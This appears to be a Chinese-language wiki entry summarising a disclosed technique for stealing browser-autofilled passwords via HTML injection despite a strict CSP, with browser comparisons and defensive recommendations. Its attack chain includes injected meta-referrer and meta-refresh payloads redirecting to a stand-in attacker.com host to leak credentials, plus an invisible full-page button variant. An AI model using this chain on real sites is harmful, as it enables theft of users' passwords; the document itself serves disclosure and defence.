# Stealing Passwords via HTML Injection Under a Strict CSP

## Ch12.062 Stealing Passwords via HTML Injection Under a Strict CSP

> 📊 Level ⭐⭐ | 7.2KB | `entities/afine-csp-html-injection-password-exfiltration.md`

# Stealing Passwords via HTML Injection Under a Strict CSP

## 摘要

AFINE Security Research 于 2026 年 6 月披露了一种在**严格 CSP（Content-Security-Policy）**下通过 HTML 注入窃取浏览器保存密码的攻击技术。核心发现：即使 CSP 设置为 `script-src 'none'`、`default-src 'none'`（理论上阻止一切脚本执行），攻击者仍可通过**Chrome 密码自动填充**机制 + **Referer 头泄露**实现密码窃取，全程无需 JavaScript。攻击链为：HTML 注入伪造表单 → Chrome 自动填充密码 → `<meta>` 标签设置 `unsafe-url` referrer 策略 → `<meta>` 重定向到攻击者域名 → Referer 头携带明文密码。

## 核心要点

### 攻击原理三要素

1. **Chrome 密码自动填充漏洞**：Chrome 会向匹配域名上的任何表单（包括通过 HTML 注入植入的伪造表单）自动填充保存的凭证——不论表单的提交目标是谁。Firefox 和 Safari 在 action 指向不同域名时拒绝自动填充，但 Chrome 不检查

2. **Referer 头泄露机制**：通过注入 `<meta name="referrer" content="unsafe-url">` 强制浏览器在页面导航时携带完整 URL（含查询参数中的密码），配合 `<meta http-equiv="Refresh">` 重定向到攻击者域名，密码通过 Referer 头泄露

3. **CSP 无法阻止**：严格 CSP 阻止了 XSS 和 CSS 注入，但**不阻止** HTML 注入、表单植入、`<meta>` 重定向和 Referer 头泄露

### 浏览器差异对比

| 行为 | Chrome | Safari | Firefox |
|------|--------|--------|---------|
| `<meta>` 覆盖 referrer 策略（`no-referrer` → 泄露） | ✅ 泄露完整 URL | ✅ 泄露 Origin | ✅ 泄露 Origin |
| `<img>` / `<script>` / `<iframe>` 泄露 | 完整 URL | 仅 Origin | 仅 Origin |
| 密码自动填充到 GET 表单 | ✅ | ✅ | ✅ |
| action 指向不同域名时拒绝填充 | ❌ 始终填充 | ✅ 拒绝 | ✅ 拒绝 |
| **整体风险等级** | **最高** | **中等** | **中等** |

Chrome 是**最不安全的**——攻击者可通过 HTML 注入在大多数标签上泄露完整 URL，且密码自动填充不检查 action 目标。

### 完整攻击链（单次点击）

```
1. 攻击者发现目标站点存在 HTML 注入（GET 参数反射）
2. 注入伪造表单（email + password），Chrome 自动填充
3. 表单中嵌入隐藏的 html 字段，携带恶意 payload：
   - <meta name="referrer" content="unsafe-url">
   - <meta http-equiv="Refresh" content="0,url=https://attacker.com">
4. 用户点击表单 → 凭证作为 GET 参数发送
5. 第二层 payload 触发 → 浏览器重定向到攻击者域名
6. Referer 头携带完整 URL（含 email + password）发送到攻击者服务器
```

整个过程**无需 JavaScript**，严格 CSP 无法阻止。

### 实际代码演示

AFINE 提供了一个 NodeJS 测试应用，展示了极严格 CSP（`default-src 'none'`, `script-src 'none'`, `form-action 'self'`）下的完整漏洞利用。关键点：CSP 的 `form-action 'self'` 允许同域表单提交，而密码管理器不区分 GET/POST 方法。

### 改进建议（可选 CSS 注入场景）

如果攻击者还能注入内联 CSS（`style-src 'unsafe-inline'`），可创建覆盖全页面的不可见按钮（`position: fixed; width: 100vw; height: 100vh; opacity: 0`），使用户点击页面任意位置即触发攻击——实现**零交互要求**的密码窃取。

## 深度分析

### CSP 的安全边界被重新定义

这篇研究揭示了 CSP 的一个根本性盲区：CSP 设计初衷是控制**资源加载**（脚本、样式、图片等），而非控制**文档行为**（表单提交、页面导航、元标签）。HTML 注入利用的是文档级别的行为——`<meta>` 标签设置 referrer 策略和页面重定向，这不在 CSP 的管辖范围内。这意味着 "严格 CSP = 安全" 的假设需要被彻底修正：CSP 是防御层之一，但不是防御 XSS/HTML 注入后果的终极手段。

### 密码管理器的设计缺陷

最深层问题不在 CSP，而在密码管理器。Chrome 的自动填充逻辑存在两个缺陷：（1）不验证表单的提交目标（action）是否可信——任何同域名表单都能获取保存的凭证；（2）不区分 GET 和 POST——GET 请求将密码暴露在 URL 中，进入服务器日志、代理日志和浏览器历史。Firefox 和 Safari 的 action 域名检查是更安全的设计，但仍允许 GET 表单自动填充。

### Referer 策略规范的实现不一致

W3C 规范定义了 referrer 策略的评估顺序：`noreferrer` link type → `referrerpolicy` 属性 → `<meta name="referrer">` → `Referrer-Policy` 头。Chrome 严格按此顺序执行，允许 `<meta>` 覆盖 HTTP 头；Safari 和 Firefox 选择忽略部分规范，构建了更安全的行为。这种规范实现不一致是 Web 安全的持续隐患。

### 对 Web 安全评估的影响

安全测试中常见的做法是：看到严格 CSP 就降低 HTML 注入的风险等级。这篇研究要求评估者重新审视：**任何可反射参数都应被视为注入点**，即使 XSS 被 CSP 阻止。HTML 注入 + 密码管理器 + Referer 泄露的组合可绕过 CSP 实现凭证窃取。

## 实践启示

1. **不要依赖 CSP 保护登录页面**：CSP 阻止 XSS 但不阻止 HTML 注入和 Referer 泄露——必须在源头修复注入（上下文编码所有反射输出）
2. **设置显式 Referrer-Policy**：对敏感应用设置 `no-referrer` 或 `same-origin`——但注意 Chrome 中 `<meta>` 仍可覆盖，这是纵深防御而非根本修复
3. **禁止在 URL 中传递凭证**：GET 参数进入服务器日志、代理日志、浏览器历史——即使没有攻击者，这也是安全反模式
4. **将任何反射参数视为注入点**：即使 CSP 阻止了 XSS，HTML 和 CSS 注入足以武器化密码自动填充
5. **浏览器安全评估需考虑密码管理器行为**：渗透测试应包含密码管理器自动填充的攻击面评估——Chrome 的不检查 action 域名行为是已知风险
6. **Web 应用应设置 `autocomplete="off"` 或限制自动填充范围**：对高安全场景，考虑在登录表单上限制浏览器自动填充行为

## 相关实体

- [Agent 安全攻防](https://github.com/QianJinGuo/wiki/blob/main/concepts/agent-security-attack-defense.md)
→ [原文存档](https://raw.githubusercontent.com/QianJinGuo/wiki/main/raw/articles/afine-csp-html-injection-password-exfiltration.md)

---

